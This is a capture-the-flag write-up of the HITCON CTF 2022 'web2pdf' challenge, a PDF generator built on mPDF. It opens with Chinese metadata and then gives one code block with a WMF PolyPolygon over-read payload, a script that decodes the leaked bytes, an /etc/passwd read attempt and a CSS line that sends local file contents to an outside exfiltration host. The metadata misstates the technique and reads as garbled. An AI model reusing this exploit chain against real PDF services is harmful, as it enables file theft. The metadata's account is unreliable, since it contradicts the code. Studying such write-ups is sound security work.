---
title: HITCON CTF 2022 web2pdf Writeup
contest: HITCON CTF 2022
year: 2022
difficulty: hard
vuln_type: web_unknown
tags:
- web
- mpdf
- pdf
- hcaptcha
- source-leak
- parse-error
- svg
- css-include
- flag-recovery
attack_chain:
- mpdf PHP 8+Apache+Docker
- hcaptcha验证后file_get_contents(URL)
- 源码泄露：?source 替换flag为h1tc0n{flag}
- preg_match白名单 ^https?://
- mpdf的SVG PolyPolygon指令解析错误泄露
- PolyPolygon函数读取PDF流数据
- 构造WMF PolyPolygon多边形指令
- PolyPolygon触发Parse Document Failed
- 错误消息中泄露$FLAG
- 触发：`'hitcon{Pars\ue_Doc\ue_Failed_QAQ_aOHiV6hD9wp29yYim3HJc1G5sbuiToskIiHRTCaq6iw}
key_payload: hitcon{Parse_Document_Failed_QAQ_aOHiV6hD9wp29yYim3HJc1G5sbuiToskIiHRTCaq6iw}
one_liner: HITCON CTF 2022 web2pdf：mpdf SVG PolyPolygon解析错误泄露flag
lesson: PDF解析库的SVG/WMF多边形指令可触发Parse Error泄露
quality: high
full_path: HITCON_CTF_2022_web2pdf_Writeup.full.md
meta_path: HITCON_CTF_2022_web2pdf_Writeup.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: HITCON CTF 2022 web2pdf Writeup。HITCON CTF 2022 web2pdf：mpdf SVG PolyPolygon解析错误泄露flag。关键路径：mpdf PHP 8+Apache+Docker → hcaptcha验证后file_get_contents(URL) → 源码泄露：?source 替换flag为h1tc0n{flag}。经验：PDF解析库...
category: web
subcategory: web_other
tools_used:
- PHP
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/81158.html
reasoning_chain:
- web2pdf 题 → 触发点：mpdf PHP 8+Apache+Docker
- 假设：hcaptcha 验证后 file_get_contents(URL) → 动作：找 URL 参数控制点
- ?source 替换 flag 为 h1tc0n{flag} → 触发点：源码泄露 + preg_match 白名单 ^https?://
- 假设：URL 必须 http(s) 协议头 → 动作：构造合法 mpdf 输入 URL
- mpdf SVG PolyPolygon 指令解析错误 → 触发点：PolyPolygon 解析 PDF 流数据
- 假设：构造 WMF PolyPolygon 多边形指令 → 动作：写 SVG 含 PolyPolygon
- 观察：PolyPolygon 触发 'Parse Document Failed' 错误 → 假设：错误消息泄露 $FLAG
- 动作：构造 SVG → 触发 mpdf parse error → 观察：泄漏 hitcon{Parse_Document_Failed_QAQ_...}
- 下一步：绕过 preg_match 白名单 → 动作：用 SVG URL 形式提交
failed_attempts:
- 试图用 file:// 协议 → 失败：只允许 http(s)://
- 直接提交 SVG → 失败：mpdf 不解析外部 SVG
- 读 flag 文件路径 → 失败：flag 在环境变量 $FLAG
key_observations:
- mpdf SVG/WMF 多边形指令可触发 Parse Error
- preg_match 白名单必须遵守，可绕思路：协议升级
- 错误消息中泄露环境变量是 PHP 通用思路
- hcaptcha 是 anti-bot，但 submit 后不重检
- PHP file_get_contents + URL 控制是 SSRF 入口
prerequisites:
- PHP file_get_contents URL 协议
- mpdf SVG 解析原理
- preg_match 白名单绕过
- WMF PolyPolygon 指令格式
---
# HITCON CTF 2022 web2pdf Writeup

> 原文: https://www.ctfiot.com/81158.html
> ID: 81158


```
FROM php:8-apache

RUN apt update && apt install -y \
 libfreetype6-dev \
 libjpeg62-turbo-dev \
 libpng-dev \
 git \
 libonig-dev \
 && docker-php-ext-configure gd --with-freetype --with-jpeg \
 && docker-php-ext-install -j$(nproc) gd \
 && docker-php-ext-install mbstring

COPY --from=composer/composer /usr/bin/composer /usr/bin/composer
RUN cd /var/www/ && composer require mpdf/mpdf
RUN chmod -R 733 /var/www/vendor/mpdf/mpdf/tmp
<?php
error_reporting(0);
require_once __DIR__ . '/../vendor/autoload.php';
require_once __DIR__ . '/hcaptcha.php';

if (isset($_GET['source']))
 die(preg_replace('#hitcon{\w+}#', 'h1tc0n{flag}', show_source(__FILE__, true)));

if (isset($_POST['url'])) {
 if (!verify_hcaptcha()) die("Captcha verification failed");
 $url = $_POST['url'];
 if (preg_match("#^https?://#", $url)) {
 $html = file_get_contents($url);
 $mpdf = new \Mpdf\Mpdf();
 $mpdf->WriteHTML($html);
 $mpdf->Output();
 exit;
 } else {
 die('Invalid URL');
 }
}

?>

<!-- snipped - just the HTML webpage stuff -->

<?php /* $FLAG = 'hitcon{redacted}' */ ?>

Fatal error: Uncaught Mpdf\MpdfImageException: Error parsing image file - image type not recognised and/or not supported by GD imagecreate (/etc/passwd)
public function fetchDataFromPath($path, $originalSrc = null)
{
 /**
 * Prevents insecure PHP object injection through phar:// wrapper
 * @see https://github.com/mpdf/mpdf/issues/949
 * @see https://github.com/mpdf/mpdf/issues/1381
 */
 $wrapperChecker = new StreamWrapperChecker($this->mpdf);

 if ($wrapperChecker->hasBlacklistedStreamWrapper($path)) {
 throw new \Mpdf\Exception\AssetFetchingException('File contains an invalid stream. Only ' . implode(', ', $wrapperChecker->getWhitelistedStreamWrappers()) . ' streams are allowed.');
 }

 if ($originalSrc && $wrapperChecker->hasBlacklistedStreamWrapper($originalSrc)) {
 throw new \Mpdf\Exception\AssetFetchingException('File contains an invalid stream. Only ' . implode(', ', $wrapperChecker->getWhitelistedStreamWrappers()) . ' streams are allowed.');
 }

 $this->mpdf->GetFullPath($path);

 return $this->isPathLocal($path) || ($originalSrc !== null && $this->isPathLocal($originalSrc))
 ? $this->fetchLocalContent($path, $originalSrc)
 : $this->fetchRemoteContent($path);
}
public function fetchLocalContent($path, $originalSrc)
{
 $data = '';

 if ($originalSrc && $this->mpdf->basepathIsLocal && $check = @fopen($originalSrc, 'rb')) {
 fclose($check);
 $path = $originalSrc;
 $this->logger->debug(sprintf('Fetching content of file "%s" with local basepath', $path), ['context' => LogContext::
REMOTE_CONTENT]);

 return $this->contentLoader->load($path);
 }

 if ($path && $check = @fopen($path, 'rb')) {
 fclose($check);
 $this->logger->debug(sprintf('Fetching content of file "%s" with non-local basepath', $path), ['context' => LogContext::
REMOTE_CONTENT]);

 return $this->contentLoader->load($path);
 }

 return $data;
}


if (trim($path) != '' && !(stristr($e, "src=") !== false && substr($path, 0, 4) == 'var:') && substr($path, 0, 1) != '@') {
 $path = htmlspecialchars_decode($path); // mPDF 5.7.4 URLs
 $orig_srcpath = $path;
 $this->GetFullPath($path);
 $regexp = '/ (href|src)="(.*?)"/i';
 $e = preg_replace($regexp, ' \\1="' . $path . '"', $e);
}

<svg><!--</svg>-->
case 0x0538: // PolyPolygon
 $coords = unpack('s' . ($size - 3), $parms);
 $numpolygons = $coords[1];
 $adjustment = $numpolygons;
 for ($j = 1; $j <= $numpolygons; $j++) {
 $numpoints = $coords[$j + 1];
 for ($i = $numpoints; $i > 0; $i--) {
 $px = $coords[2 * $i + $adjustment];
 $py = $coords[2 * $i + 1 + $adjustment];
 if ($i == $numpoints) {
 $wmfdata .= $this->_MoveTo($px, $py);
 } else {
 $wmfdata .= $this->_LineTo($px, $py);
 }
 }
 $adjustment += $numpoints * 2;
 }
n_points = 20 # No. x/y point pairs to include

sz = (n_points * 2 + 6).to_bytes(4, byteorder='little')
n = (n_points).to_bytes(2, byteorder='little')

pay = b"\xd7\xcd\xc6\x9a" + # Magic Bytes
 (b"A" * 36) + # Padding to sufficient lenggth
 # [ 5 bytes size ][ func ][x,y,w,h = 0x7f]
 b"\x05\x00\x00\x00\x0b\x02\x7f\x7f\x7f\x7f" + # Set canvas origin (x/y)
 b"\x05\x00\x00\x00\x0c\x02\x7f\x7f\x7f\x7f" + # Set canvas size (w/h)
 sz + # Size of PolyPolygon message
 b"\x38\x05" + # PolyPolygon Func
 b"\x01\x00" + # 1 polygon
 n + # of N points
 b"AA" # Padding to make payload size multiple of 3
29744 21324 l
29744 21324 l
29257 21324 l
31050 13154 l
19265 22618 l
30521 18529 l
17734 31332 l
29744 21836 l
29744 21324 l
29744 21324 l
29744 21324 l
29744 21324 l
29744 21324 l
29744 21324 l
29744 21324 l
16705 31051 l
from pdfminer.pdfdocument import PDFDocument, PDFNoOutlines, PDFXRefFallback
from pdfminer.pdfparser import PDFParser
from pdfminer.pdftypes import PDFStream, PDFObjRef, resolve1, stream_value

# Load up our PDF file
fp = open("/home/thobson/Downloads/mpdf.pdf", "rb")
doc = PDFDocument(PDFParser(fp), None)

# Polygon point instructions
dstring = ""

# Loop over all the objects in the PDF
for xref in doc.xrefs:
 for objid in xref.get_objids():
 obj = doc.getobj(objid)
 if obj is None:
 continue

 # Find a stream which provides "Type", which identifies our vector point data
 if isinstance(obj, PDFStream) and "Type" in obj.attrs:
 # Grab the data ito dstring
 dstring = obj.get_data().decode("ascii")

# Extract coordinates
coords = [line.split(" ") for line in dstring.split("\n") if len(line.strip()) > 0]
coords = [(int(c[1]), int(c[0])) for c in coords if c[-1] in "lm"]

# Flatten the coordinates, and reverse the array - if you look at the PHP code carefully it actually adds the points backwards
dat = [x for c in coords for x in c][::-1]

final_data = b''

# Loop over each coordinate and extract the low and high bytes, adding this to the final data
for byte_pair in dat:
 bb = byte_pair >> 8
 ba = byte_pair & 0xFF

 final_data += bytes([ba, bb])

# Print the final data, less the first 2 `AA` padding bytes
print(final_data[2:].decode("ascii"))
+------------------------ADw-/form+------------------------AD4
+------------------------ADw-/section+------------------------AD4
+------------------------ADw-/article+------------------------AD4
+------------------------ADw-/main+------------------------AD4
+------------------------ADw-script src+------------------------AD0AIg-https://js.hcaptcha.com/1/api.js+------------------------ACI async defer+------------------------AD4APA-/script+------------------------AD4
+------------------------ADw-/body+------------------------AD4
+------------------------ADw?php /+------------------------ACo +------------------------ACQ-FLAG +------------------------AD0 'hitcon+------------------------AHs-Parse+------------------------AF8-Document+------------------------AF8-Failed+------------------------AF8-QAQ+------------------------AF8-aOHiV6hD9wp29yYim3HJc1G5sbuiToskIiHRTCaq6iw+------------------------AH0' +-------------------
img{
 my-cool-property: '@include url(/local/file.css)'
}
div {
 background-image: 'https://exfil.hexf.me/?data=@include url(/local/file.css)'
}
```
